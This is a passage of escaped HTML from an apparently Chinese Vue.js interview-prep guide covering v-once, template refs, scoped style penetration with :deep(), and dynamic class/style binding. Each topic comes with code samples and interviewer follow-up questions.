后同样写法却可能命中根元素点击，你会如何解释并避免迁移误判？</strong></p>\\n<p><code>Vue 2</code> 的组件事件默认等待子组件 <code>$emit(\'click\')</code>，监听原生根节点事件需要 <code>.native</code>。<code>Vue 3</code> 移除了 <code>.native</code>，未在 <code>emits</code> 声明的监听器可能透传到根元素；迁移时应明确事件契约，并核对多根节点和 <code>emits</code> 声明。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_40-v-once的使用场景有哪些\\"><a class=\\"header-anchor\\" href=\\"#_40-v-once的使用场景有哪些\\">#</a> 40 v-once的使用场景有哪些</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>v-once</code> 让元素/组件<strong>只渲染一次</strong>，之后完全跳过更新，节点被当作静态内容缓存</li>\\n<li>场景：大段永不变化的静态文案、只在初始化时渲染一次的配置展示、长列表里的静态部分</li>\\n<li>原理：编译时打上静态标记，<code>patch</code> 时直接复用上次的 <code>VNode</code>，不进 diff</li>\\n<li>⚠️ 代价是节点<strong>脱离响应式</strong>——将来数据要变时会出现&quot;改了页面不动&quot;的诡异 bug，且很难查</li>\\n<li><code>Vue 3.2+</code> 的 <code>v-memo</code> 更可控：按依赖数组决定要不要更新，语义比&quot;永不更新&quot;明确</li>\\n</ul>\\n<p><strong><code>v-once</code> 适合初始化后确定不会变化的元素或组件，让它只渲染一次并跳过后续更新。</strong> 比如大段静态文案、固定配置展示，或者长列表中永远不变的部分，编译器会缓存首次生成的节点，后续渲染直接复用。它的代价是这块内容会脱离后续响应式更新，数据即使变了，页面也不会跟着变化，因此不能随意用于可能调整的业务状态。需要按依赖决定是否更新时，<code>Vue 3.2+</code> 的 <code>v-memo</code> 会比“永不更新”更可控。</p>\\n</section>\\n<p><strong>分析</strong></p>\\n<p><code>v-once</code>是<code>Vue</code>中内置指令，很有用的<code>API</code>，在优化方面经常会用到</p>\\n<p><strong>体验</strong></p>\\n<p>仅渲染元素和组件一次，并且跳过未来更新</p>\\n<pre class=\\"language-html\\"><code>&lt;!-- single element --&gt;\\n&lt;span v-once&gt;This will never change: {{msg}}&lt;/span&gt;\\n&lt;!-- the element have children --&gt;\\n&lt;div v-once&gt;\\n  &lt;h1&gt;comment&lt;/h1&gt;\\n  &lt;p&gt;{{msg}}&lt;/p&gt;\\n&lt;/div&gt;\\n&lt;!-- component --&gt;\\n&lt;my-component v-once :comment=&quot;msg&quot;&gt;&lt;/my-component&gt;\\n&lt;!-- `v-for` directive --&gt;\\n&lt;ul&gt;\\n  &lt;li v-for=&quot;i in list&quot; v-once&gt;{{i}}&lt;/li&gt;\\n&lt;/ul&gt;\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ul>\\n<li><code>v-once</code>是<code>vue</code>的内置指令，作用是仅渲染指定组件或元素一次，并跳过未来对其更新</li>\\n<li>如果我们有一些元素或者组件在初始化渲染之后不再需要变化，这种情况下适合使用<code>v-once</code>，这样哪怕这些数据变化，<code>vue</code>也会跳过更新，是一种代码优化手段</li>\\n<li>我们只需要作用的组件或元素上加上<code>v-once</code>即可</li>\\n<li><code>vue3.2</code>之后，又增加了<code>v-memo</code>指令，可以有条件缓存部分模板并控制它们的更新，可以说控制力更强了</li>\\n<li>编译器发现元素上面有<code>v-once</code>时，会将首次计算结果存入缓存对象，组件再次渲染时就会从缓存获取，从而避免再次计算</li>\\n</ul>\\n<p><strong>原理</strong></p>\\n<p>下面例子使用了<code>v-once</code>：</p>\\n<pre class=\\"language-html\\"><code>&lt;script setup&gt;\\nimport { ref } from &#39;vue&#39;\\n​\\nconst msg = ref(&#39;Hello World!&#39;)\\n&lt;/script&gt;\\n​\\n&lt;template&gt;\\n  &lt;h1 v-once&gt;{{ msg }}&lt;/h1&gt;\\n  &lt;input v-model=&quot;msg&quot;&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p>我们发现<code>v-once</code>出现后，编译器会缓存作用元素或组件，从而避免以后更新时重新计算这一部分：</p>\\n<pre class=\\"language-js\\"><code>// ...\\nreturn (_ctx, _cache) =&gt; {\\n  return (_openBlock(), _createElementBlock(_Fragment, null, [\\n    // 从缓存获取vnode\\n    _cache[0] || (\\n      _setBlockTracking(-1),\\n      _cache[0] = _createElementVNode(&quot;h1&quot;, null, [\\n        _createTextVNode(_toDisplayString(msg.value), 1 /* TEXT */)\\n      ]),\\n      _setBlockTracking(1),\\n      _cache[0]\\n    ),\\n// ...\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>订单详情页把金额节点标成 <code>v-once</code>，切换币种后输入框数据已变化，页面金额却停留在首次结果；这是缓存失效还是预期行为？</strong></p>\\n<p>这是 <code>v-once</code> 的预期行为，它只计算并渲染首次结果，后续依赖变化也会跳过更新。币种或金额可能变化的节点不满足“初始化后永不改变”的约束，应移除该指令，不能把业务错误当成缓存失效排查。</p>\\n</li>\\n<li>\\n<p><strong>文章详情页有一块服务端下发后不会再变的版权声明，父组件却因评论输入频繁更新；你会在哪里使用 <code>v-once</code>？</strong></p>\\n<p>可以把 <code>v-once</code> 放在版权声明的最小稳定根节点上，使该子树首次渲染后直接复用缓存的 <code>VNode</code>。不要把可能变化的阅读数、登录状态或按钮一起包进去，否则它们也会永久停留在首次渲染结果。</p>\\n</li>\\n<li>\\n<p><strong>后台表格的每行状态大部分时间不变，但审核操作后必须刷新；同事为了减少更新给整行加 <code>v-once</code>，你会换成什么？</strong></p>\\n<p>整行不能使用 <code>v-once</code>，因为审核后的状态变化必须进入视图。若项目版本支持且确有跳过更新的价值，可用 <code>v-memo</code> 按状态等依赖决定是否复用；依赖数组遗漏字段时仍会产生陈旧界面。</p>\\n</li>\\n<li>\\n<p><strong>一个带 <code>v-once</code> 的用户头像组件在账号切换后仍显示旧用户，接口响应和父组件状态都正确，你会如何快速确认故障点？</strong></p>\\n<p>先检查头像组件或其祖先节点是否带有 <code>v-once</code>，再确认账号切换是否只是更新属性而没有重新创建该节点。命中后应移除指令或缩小作用范围；依赖切换 <code>key</code> 强制重建虽能刷新，但会掩盖错误的稳定性假设。</p>\\n</li>\\n<li>\\n<p><strong>长列表滚动卡顿，页面一次渲染大量条目；有人提议给每个 <code>li</code> 加 <code>v-once</code>，另一人主张先做虚拟列表，你支持哪边？</strong></p>\\n<p>先考虑虚拟列表，因为它直接减少同时存在和参与渲染的节点数量，而 <code>v-once</code> 只跳过已渲染子树的未来更新。只有条目确实永不变化时才可局部使用 <code>v-once</code>；若内容会更新，它会用正确性换取有限优化。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_41-vue-ref的作用\\"><a class=\\"header-anchor\\" href=\\"#_41-vue-ref的作用\\">#</a> 41 Vue Ref的作用</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>ref</code> 是拿到<strong>原生 <code>DOM</code> 元素</strong>或<strong>子组件实例</strong>的逃生口；<code>v-for</code> 上会收集成数组</li>\\n<li>⚠️ 只在<strong>挂载后</strong>可用，<code>created</code> 里是 <code>undefined</code>；<code>v-if</code> 为假时也是 <code>undefined</code>，用前要判空</li>\\n<li><code>$refs</code> <strong>不是响应式的</strong>，直接 <code>watch</code> 它不会触发</li>\\n<li>用它读写子组件数据是<strong>反模式</strong>（绕过单向数据流）；合理用途是调用子组件的<strong>命令式方法</strong>（<code>validate</code>/<code>reset</code>）</li>\\n<li><code>Vue 3</code> 的 <code>&lt;script setup&gt;</code> 默认封闭，父组件要拿内部方法必须子组件 <code>defineExpose</code> 显式暴露</li>\\n</ul>\\n<p><strong><code>ref</code> 是直接拿到原生 <code>DOM</code> 元素或子组件实例的入口，常用于处理数据驱动不方便表达的命令式操作。</strong> 例如聚焦输入框、测量尺寸、初始化图表，或调用子组件暴露的 <code>validate()</code>、<code>reset()</code>；写在 <code>v-for</code> 上时会收集为数组。它只能在挂载后可靠使用，遇到 <code>v-if</code> 还要判空，而且 <code>$refs</code> 本身不是响应式数据。父组件不应借它随意读写子组件状态；在 <code>Vue 3</code> 的 <code>&lt;script setup&gt;</code> 中，子组件还需通过 <code>defineExpose</code> 明确暴露接口。</p>\\n</section>\\n<p><code>ref</code> 是 <code>Vue</code> 提供的&quot;直接拿到 <code>DOM</code> 元素或组件实例&quot;的逃生口。</p>\\n<p><strong>三种用法：</strong></p>\\n<pre class=\\"language-vue\\"><code>&lt;template&gt;\\n  &lt;input ref=&quot;input&quot; /&gt;           &lt;!-- ① 拿原生 DOM --&gt;\\n  &lt;Child ref=&quot;child&quot; /&gt;           &lt;!-- ② 拿子组件实例 --&gt;\\n  &lt;li v-for=&quot;i in list&quot; ref=&quot;items&quot; /&gt;  &lt;!-- ③ v-for 上会收集成数组 --&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// Vue 2 / Options API\\nthis.$refs.input.focus()          // 操作 DOM\\nthis.$refs.child.someMethod()     // 调用子组件方法\\nthis.$refs.child.someData         // 读子组件数据（不推荐）\\n\\n// Vue 3 组合式 API：变量名必须和 ref 属性同名\\nconst input = ref(null)\\nonMounted(() =&gt; input.value.focus())\\n</code></pre>\\n<p><strong>四个必须知道的点：</strong></p>\\n<p><strong>① <code>$refs</code> 只在挂载后可用。</strong> <code>created</code> 里访问是 <code>undefined</code>，因为那时模板还没变成真实 <code>DOM</code>。同理，<code>v-if</code> 为假时对应的 <code>ref</code> 也是 <code>undefined</code>，用之前要判空。</p>\\n<p><strong>② <code>$refs</code> 不是响应式的。</strong> 它在渲染过程中被赋值，直接 <code>watch</code> 它不会触发。要响应 <code>ref</code> 的变化得用 <code>Vue 3</code> 的函数式 ref 或者 <code>watchEffect</code> 配合 <code>nextTick</code>。</p>\\n<p><strong>③ 用它读写子组件数据是反模式。</strong> 这绕过了 <code>props</code>/<code>emit</code> 的单向数据流，父组件直接改子组件内部状态，数据来源变得不可追踪。合理的用途是<strong>调用子组件的命令式方法</strong>（<code>validate()</code>、<code>reset()</code>、<code>scrollTo()</code>）—— 这类&quot;动作&quot;用事件表达反而别扭。</p>\\n<p><strong>④ <code>Vue 3</code> 的 <code>&lt;script setup&gt;</code> 里子组件默认是封闭的</strong>，父组件通过 <code>ref</code> 拿不到它的内部状态，必须子组件显式 <code>defineExpose({ validate, reset })</code> 暴露。这是个很好的设计 —— 它把&quot;哪些是对外接口&quot;变成了显式声明。</p>\\n<p><strong>什么时候该用 <code>ref</code>：</strong></p>\\n<ul>\\n<li>聚焦、滚动、选中文本这类原生 <code>DOM</code> 操作</li>\\n<li>集成第三方库（图表、地图、编辑器）时拿容器元素</li>\\n<li>调用子组件的命令式方法（表单校验、重置）</li>\\n<li>测量元素尺寸（配合 <code>ResizeObserver</code>）</li>\\n</ul>\\n<p><strong>什么时候不该用</strong>：能用数据驱动表达的，就不要用 <code>ref</code> 去直接改 <code>DOM</code> ——那会让状态和视图失去同步，是 <code>Vue</code> 项目里最常见的&quot;越写越乱&quot;的源头。</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>父组件通过 <code>this.$refs.profile.name = \'A\'</code> 修改子组件资料，页面暂时正常，但状态来源已经无法追踪；你会在评审里怎么改？</strong></p>\\n<p>应把资料通过 <code>props</code> 下发，并由子组件用 <code>emit</code> 上报变更，避免父组件直接写入子组件内部状态。<code>ref</code> 更适合调用 <code>validate()</code>、<code>reset()</code>、<code>scrollTo()</code> 这类命令式动作；任意读写状态会破坏单向数据流。</p>\\n</li>\\n<li>\\n<p><strong>登录页要求接口报错后自动聚焦账号输入框，代码在 <code>created</code> 中执行 <code>this.$refs.account.focus()</code> 却报 <code>undefined</code>，应该放到哪里？</strong></p>\\n<p>应在组件挂载后访问该引用，例如放入 <code>mounted</code>；组合式 <code>API</code> 中可在 <code>onMounted</code> 里调用模板 <code>ref</code> 的 <code>.value.focus()</code>。<code>created</code> 阶段真实 <code>DOM</code> 尚未生成，即使变量名正确也拿不到输入元素。</p>\\n</li>\\n<li>\\n<p><strong>弹窗由 <code>v-if</code> 控制，设置 <code>show = true</code> 后紧接着调用 <code>this.$refs.modal.focus()</code> 偶发失败，测试要求首次打开也稳定聚焦，怎么处理？</strong></p>\\n<p>设置显示状态后等待一次 <code>nextTick</code>，再判空调用 <code>focus()</code>，因为 <code>v-if</code> 对应节点要等本轮视图更新后才会挂载。关闭弹窗或组件卸载时引用还会再次变空，所以不能把 <code>$refs</code> 当成始终存在的对象。</p>\\n</li>\\n<li>\\n<p><strong><code>Vue 3</code> 的 <code>&lt;script setup&gt;</code> 子组件里有 <code>validate</code> 和十几个内部状态，父表单通过模板 <code>ref</code> 什么都拿不到；你会暴露哪些内容？</strong></p>\\n<p>只用 <code>defineExpose({ validate, reset })</code> 暴露父组件确实需要调用的命令式接口，不暴露内部响应式状态。<code>&lt;script setup&gt;</code> 默认封闭能迫使组件明确公共契约；暴露过多会重新造成强耦合，并增加重构成本。</p>\\n</li>\\n<li>\\n<p><strong>图表组件需要获取容器尺寸并在布局变化时重绘，产品还要求响应侧栏收起；直接监听 <code>$refs.chart.clientWidth</code> 是否可靠？</strong></p>\\n<p>不可靠，因为 <code>$refs</code> 本身不是响应式数据，尺寸变化也不会让对它的 <code>watch</code> 自动触发。应在挂载后通过 <code>ref</code> 取得容器，再配合 <code>ResizeObserver</code> 监听尺寸；卸载时还要解除观察，避免保留无效引用和回调。</p>\\n</li>\\n<li>\\n<p><strong>列表里每个输入框都写了相同的 <code>ref=&quot;items&quot;</code>，排序后业务代码按数组下标聚焦却命中错误行，你会怎样降低这种耦合？</strong></p>\\n<p>不要把收集到的引用数组下标当作稳定业务标识，列表重排后元素顺序可能改变。可用函数式 <code>ref</code> 按稳定 <code>id</code> 维护映射，并在节点卸载时清理；若聚焦能由状态驱动表达，则优先避免维护命令式引用集合。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_42-scoped样式穿透\\"><a class=\\"header-anchor\\" href=\\"#_42-scoped样式穿透\\">#</a> 42 scoped样式穿透</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>scoped</code> 原理：给模板元素加 <code>data-v-xxx</code> 属性，给选择器拼上 <code>[data-v-xxx]</code>，靠属性选择器隔离</li>\\n<li>子组件内部元素没有父组件的标记，所以选不中 —— 但<strong>子组件根元素同时带父子两个标记</strong>，调外边距/宽高不需要穿透</li>\\n<li>穿透写法：<code>Vue 3</code> 用 <code>:deep()</code>，<code>Vue 2</code> 用 <code>::v-deep</code>（<code>/deep/</code> 在 <code>Sass</code> 里已废弃会报错）</li>\\n<li>另两个伪类：<code>:slotted()</code> 作用于插槽内容、<code>:global()</code> 在 scoped 块里写全局样式</li>\\n<li>⚠️ 穿透依赖别人的内部结构和类名，组件库升级会<strong>静默失效</strong> —— 优先用 <code>props</code>、<code>CSS</code> 变量、主题方案</li>\\n</ul>\\n<p><strong><code>scoped</code> 样式需要影响子组件内部元素时，<code>Vue 3</code> 使用 <code>:deep()</code>，<code>Vue 2</code> 通常使用 <code>::v-deep</code>。</strong> 本质上，编译器会给当前组件元素和选择器添加 <code>data-v-xxx</code> 标记，而子组件内部没有父组件的标记，所以普通选择器无法命中。子组件根元素会同时带上父子标记，因此只调整它的宽高、外边距或定位时，不需要穿透；插槽和全局样式还可分别用 <code>:slotted()</code>、<code>:global()</code>。穿透会依赖组件内部结构和类名，升级后可能静默失效，所以应优先考虑组件 <code>props</code>、<code>CSS</code> 变量或主题方案。</p>\\n</section>\\n<p><strong>先搞清 <code>scoped</code> 的原理，穿透的写法才好理解。</strong></p>\\n<p>编译时 <code>vue-loader</code> 做两件事：给组件模板里的每个元素加一个唯一属性 <code>data-v-xxx</code>，同时给这个组件的每条 <code>CSS</code> 选择器末尾拼上 <code>[data-v-xxx]</code>：</p>\\n<pre class=\\"language-css\\"><code>/* 你写的 */\\n.box { color: red; }\\n/* 编译后 */\\n.box[data-v-7ba5bd90] { color: red; }\\n</code></pre>\\n<p>因为属性只加在<strong>当前组件模板</strong>里的元素上，子组件内部的元素没有这个标记，所以父组件的样式选不中它们 —— 这就是隔离的实现方式。</p>\\n<p><strong>一个关键例外：子组件的根元素同时带父子两个标记。</strong></p>\\n<p>这是 <code>Vue</code> 特意设计的，目的是让父组件能控制子组件的&quot;外部布局&quot;（外边距、宽高、定位）。所以调整子组件在页面上的位置和大小<strong>根本不需要穿透</strong>。</p>\\n<p><strong>三种穿透写法：</strong></p>\\n<pre class=\\"language-css\\"><code>/* Vue 3 统一写法 */\\n.wrap :deep(.child-inner) { background: red; }\\n\\n/* Vue 2 */\\n.wrap ::v-deep .child-inner { background: red; }\\n.wrap /deep/ .child-inner { background: red; }   /* Sass 里已废弃，会报错 */\\n</code></pre>\\n<p>编译结果是把属性选择器提到前面：<code>.wrap[data-v-xxx] .child-inner</code> —— 这样后半段就不再受标记限制了。</p>\\n<p><strong>另外两个相关伪类（<code>Vue 3</code>）：</strong></p>\\n<ul>\\n<li><code>:slotted(.foo)</code> —— 作用于<strong>插槽传进来的内容</strong>。默认情况下插槽内容属于父组件作用域，子组件的 <code>scoped</code> 样式选不中它。</li>\\n<li><code>:global(.foo)</code> —— 在 <code>scoped</code> 块里写一条全局样式，不加属性选择器。</li>\\n</ul>\\n<p><strong>为什么应该少用穿透：</strong></p>\\n<p><code>:deep()</code> 本质是<strong>依赖别人的内部 <code>DOM</code> 结构和类名</strong>。组件库一次重构，你的样式就全断了，而且是静默失效、不报错。所以优先级应该是：</p>\\n<ol>\\n<li>用组件暴露的 <code>props</code>（<code>size</code>、<code>type</code>、<code>popper-class</code>、<code>class</code>）</li>\\n<li>用组件库提供的 <code>CSS</code> 变量或主题定制方案</li>\\n<li>实在没有才用 <code>:deep()</code>——并且把这类样式<strong>集中放在一个文件里</strong>、写注释说明依赖了哪个版本的哪个类名，升级时有据可查</li>\\n</ol>\\n<p>下面是具体写法示例：</p>\\n<blockquote>\\n<p><code>scoped</code>虽然避免了组件间样式污染，但是很多时候我们需要修改组件中的某个样式，但是又不想去除<code>scoped</code>属性</p>\\n</blockquote>\\n<ol>\\n<li>使用<code>/deep/</code></li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;!-- Parent --&gt;\\n&lt;template&gt;\\n&lt;div class=&quot;wrap&quot;&gt;\\n    &lt;Child /&gt;\\n&lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;style lang=&quot;scss&quot; scoped&gt;\\n.wrap /deep/ .box{\\n    background: red;\\n}\\n&lt;/style&gt;\\n\\n&lt;!-- Child --&gt;\\n&lt;template&gt;\\n    &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<ol start=\\"2\\">\\n<li>使用两个<code>style</code>标签</li>\\n</ol>\\n<pre class=\\"language-html\\"><code>&lt;!-- Parent --&gt;\\n&lt;template&gt;\\n&lt;div class=&quot;wrap&quot;&gt;\\n    &lt;Child /&gt;\\n&lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;style lang=&quot;scss&quot; scoped&gt;\\n/* 其他样式 */\\n&lt;/style&gt;\\n&lt;style lang=&quot;scss&quot;&gt;\\n.wrap .box{\\n  background: red;\\n}\\n&lt;/style&gt;\\n\\n&lt;!-- Child --&gt;\\n&lt;template&gt;\\n  &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>父组件的 <code>scoped</code> 样式 <code>.dialog .title</code> 在自己模板中生效，却选不中子组件内部的 <code>.title</code>；同事说是选择器优先级不够，你怎么判断？</strong></p>\\n<p>这通常不是优先级问题，而是编译后的作用域属性不匹配：父样式会带 <code>[data-v-xxx]</code>，子组件内部节点没有父组件的标记。需要修改内部节点时可写 <code>.dialog :deep(.title)</code>，但它会依赖子组件内部结构。</p>\\n</li>\\n<li>\\n<p><strong>页面只需要调整子组件卡片的宽度和外边距，开发者却写了多层 <code>:deep()</code> 穿透到内部容器；你会如何收敛？</strong></p>\\n<p>优先直接给子组件根元素设置宽度和外边距，不必穿透，因为根元素会同时带父子组件的作用域标记。父组件控制外部布局属于 <code>scoped</code> 特意保留的能力；只有内部外观无法通过公开接口调整时才考虑 <code>:deep()</code>。</p>\\n</li>\\n<li>\\n<p><strong>项目从 <code>Vue 2</code> 迁移到 <code>Vue 3</code>，原来的 <code>.wrap /deep/ .item</code> 在 <code>Sass</code> 构建时报错，团队应统一成什么写法？</strong></p>\\n<p>统一改为 <code>Vue 3</code> 的 <code>.wrap :deep(.item)</code>，它会把作用域属性限制在穿透点之前。<code>/deep/</code> 属于旧写法且在 <code>Sass</code> 中已废弃，继续保留会造成构建兼容问题；迁移时还应检查选择器是否仍依赖旧组件结构。</p>\\n</li>\\n<li>\\n<p><strong>组件库升级后，二十多处 <code>:deep(.library-input__inner)</code> 静默失效，页面没有报错但主题全部错乱；你会怎样组织排查和修复？</strong></p>\\n<p>先确认升级后内部类名或 <code>DOM</code> 层级是否变化，再集中搜索所有依赖该内部选择器的 <code>:deep()</code> 规则。修复时优先改用组件公开的 <code>props</code>、<code>CSS</code> 变量或主题能力；无法替代的穿透应集中管理并注明依赖版本。</p>\\n</li>\\n<li>\\n<p><strong>设计师要求统一修改组件库输入框颜色，方案 <code>A</code> 是全局覆盖内部类名，方案 <code>B</code> 是逐页写 <code>:deep()</code>，方案 <code>C</code> 是使用库提供的主题变量，你怎么选？</strong></p>\\n<p>优先选主题变量，因为它属于组件库公开的定制契约，升级时通常比内部类名稳定。逐页 <code>:deep()</code> 会造成重复和遗漏，全局覆盖则扩大污染范围；只有公开能力无法满足时，才集中使用带作用域边界的穿透规则。</p>\\n</li>\\n<li>\\n<p><strong>子组件想给父组件传入的插槽标签加样式，同时还要在同一个 <code>scoped</code> 块里声明一条全局工具类；分别该用什么能力？</strong></p>\\n<p>插槽内容使用 <code>:slotted(.foo)</code>，因为该内容默认属于父组件作用域，子组件普通 <code>scoped</code> 选择器无法命中。全局工具类使用 <code>:global(.foo)</code> 取消作用域属性；两者都会扩大样式影响，选择器应保持具体且受控。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_43-class-与-style-如何动态绑定\\"><a class=\\"header-anchor\\" href=\\"#_43-class-与-style-如何动态绑定\\">#</a> 43 Class 与 Style 如何动态绑定</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>:class</code> 和 <code>:style</code> 都支持<strong>对象语法</strong>（按条件切换）和<strong>数组语法</strong>（同时应用多个），可以嵌套混用</li>\\n<li><code>:style</code> 的属性名用 camelCase 或加引号的 kebab-case 都行</li>\\n<li>会和静态 <code>class</code> <strong>自动合并</strong>，不会互相覆盖</li>\\n<li>复杂条件抽成 <code>computed</code> 返回对象 —— 模板可读性更好，还能享受缓存</li>\\n<li>组件上的 <code>class</code>/<code>style</code> 会自动透传到根元素（<code>$attrs</code> 里的特例），但<strong>多根节点组件不会</strong>，要手动绑</li>\\n<li>⚠️ <code>:style</code> 是内联样式，权重仅次于 <code>!important</code>——能用 <code>:class</code> 表达的状态就别用它</li>\\n</ul>\\n<p><strong><code>Vue</code> 的 <code>class</code> 和 <code>style</code> 都能通过对象或数组动态绑定，两种写法也可以混用。</strong> 对象适合按条件切换，数组适合组合多组类名或样式，并且动态 <code>class</code> 会与静态类名自动合并。复杂判断我一般会放进 <code>computed</code>，避免模板难读。组件只有一个根节点时会自动透传 <code>class</code> 和 <code>style</code>，多根节点则需要手动绑定；能用类名表达的状态，也尽量别写成高权重的内联样式。</p>\\n</section>\\n<p><code>:class</code> 和 <code>:style</code> 都支持<strong>对象语法</strong>和<strong>数组语法</strong>，而且可以混用。</p>\\n<p><strong><code>:class</code> 对象语法 —— 按条件切换</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;div :class=&quot;{ active: isActive, &#39;text-danger&#39;: hasError }&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<p>键是类名、值是布尔表达式，为真才加上。类名带连字符时要加引号。</p>\\n<p><strong><code>:class</code> 数组语法 —— 同时应用多个</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;div :class=&quot;[activeClass, errorClass]&quot;&gt;&lt;/div&gt;\\n&lt;div :class=&quot;[isActive ? &#39;active&#39; : &#39;&#39;, &#39;base&#39;]&quot;&gt;&lt;/div&gt;\\n&lt;div :class=&quot;[{ active: isActive }, &#39;base&#39;]&quot;&gt;&lt;/div&gt;   &lt;!-- 数组里套对象 --&gt;\\n</code></pre>\\n<p><strong><code>:style</code> 同理</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;div :style=&quot;{ color: activeColor, fontSize: size + &#39;px&#39; }&quot;&gt;&lt;/div&gt;\\n&lt;div :style=&quot;[baseStyles, overridingStyles]&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<p>属性名用 <strong>camelCase</strong>（<code>fontSize</code>）或加引号的 kebab-case（<code>\'font-size\'</code>）都行。</p>\\n<p><strong>四个实用要点：</strong></p>\\n<p><strong>① 会和静态 <code>class</code> 自动合并</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;div class=&quot;card&quot; :class=&quot;{ active: isActive }&quot;&gt;&lt;/div&gt;\\n&lt;!-- 结果：class=&quot;card active&quot; —— 不会互相覆盖 --&gt;\\n</code></pre>\\n<p><strong>② 复杂逻辑要抽成 <code>computed</code></strong></p>\\n<pre class=\\"language-js\\"><code>computed: {\\n  classObject() {\\n    return { active: this.isActive &amp;&amp; !this.error, &#39;text-danger&#39;: this.error }\\n  },\\n}\\n</code></pre>\\n<p>模板里塞一大段三元表达式既难读也没法复用，抽到 <code>computed</code> 还能享受缓存。</p>\\n<p><strong>③ <code>:style</code> 支持多值兜底</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;div :style=&quot;{ display: [&#39;-webkit-box&#39;, &#39;flex&#39;] }&quot;&gt;&lt;/div&gt;\\n</code></pre>\\n<p>浏览器会渲染它支持的最后一个值，用于做前缀降级。不过 <code>Vue</code> 本身也会自动加前缀，日常很少用到。</p>\\n<p><strong>④ 组件上的 <code>class</code>/<code>style</code> 会透传到根元素</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;MyComponent class=&quot;mt-4&quot; :style=&quot;{ width: &#39;100%&#39; }&quot; /&gt;\\n</code></pre>\\n<p>这两个属性比较特殊 —— 即使组件没声明，它们也会自动合并到组件的根元素上（而不是被 <code>$attrs</code> 收集后丢弃）。但<strong>多根节点组件（<code>Vue 3</code> 的 Fragment）不会自动透传</strong>，必须手动绑定，否则会出现&quot;外面加的样式类莫名不生效&quot;。</p>\\n<p><strong>性能上的一个提醒</strong>：<code>:style</code> 是内联样式，权重很高（仅次于 <code>!important</code>），会让后续的 <code>CSS</code> 覆盖变困难。能用类名表达的状态就用 <code>:class</code>，<code>:style</code> 留给真正需要动态计算的数值（拖拽位置、进度条宽度、动态高度）。</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品卡片同时写了 <code>class=&quot;card&quot;</code> 和 <code>:class=&quot;{ active: selected }&quot;</code>，选中后有人担心动态绑定会覆盖静态类，你怎么判断？</strong></p>\\n<p>两者会自动合并，选中时结果同时包含 <code>card</code> 和 <code>active</code>，不会因为使用 <code>:class</code> 丢掉静态类。对象的键是类名、值是布尔表达式；带连字符的键应写成 <code>\'text-danger\'</code>。若样式仍异常，应继续检查选择器权重，而不是先怀疑类名合并。</p>\\n</li>\\n<li>\\n<p><strong>订单列表一行要根据选中、禁用、错误和权限状态组合六七个类，模板里已经堆了多层三元表达式，你会怎样落地？</strong></p>\\n<p>应把组合条件抽到 <code>computed</code>，返回供 <code>:class</code> 使用的对象或数组，让模板只保留绑定入口。这样复杂判断可复用，并能利用计算属性缓存；固定基础类仍写在静态 <code>class</code>。若每行条件依赖不同数据，则应按行计算，避免错误共享同一个结果。</p>\\n</li>\\n<li>\\n<p><strong>进度条宽度是接口返回的连续百分比，设计师又要求主题颜色、圆角和过渡都可调整，你会全部放进 <code>:style</code> 吗？</strong></p>\\n<p>只把连续变化且难以枚举的 <code>width</code> 放进 <code>:style</code>，主题颜色、圆角和过渡优先交给类名。内联样式权重高，全部动态化会增加后续覆盖和主题切换成本。对象属性可写 <code>fontSize</code>，或用加引号的 <code>\'font-size\'</code>，数值单位也要显式补齐。</p>\\n</li>\\n<li>\\n<p><strong>给一个 <code>Vue 3</code> 双根布局组件传了 <code>class=&quot;mt-4&quot;</code> 和 <code>:style=&quot;{ width: \'100%\' }&quot;</code>，线上却完全没落到 <code>DOM</code>，你先查哪里？</strong></p>\\n<p>先确认组件是否存在多个根节点；<code>Fragment</code> 场景下，<code>class</code> 和 <code>style</code> 不会自动决定透传目标。应在预期根元素上显式绑定 <code>$attrs</code>，或分别绑定 <code>$attrs.class</code> 与 <code>$attrs.style</code>，再结合警告定位。若实际是单根节点，则用开发者工具检查属性是否已合并以及 <code>CSS</code> 是否被更高权重规则覆盖。</p>\\n</li>\\n<li>\\n<p><strong>拖拽面板的位置每帧变化，团队争论用动态类名还是 <code>:style</code>，同时还要兼容不同浏览器的 <code>display</code> 值，你怎么选？</strong></p>\\n<p>拖拽坐标属于实时计算值，应使用 <code>:style</code>；若预先生成大量位置类，会让样式表和状态映射失控。<code>display</code> 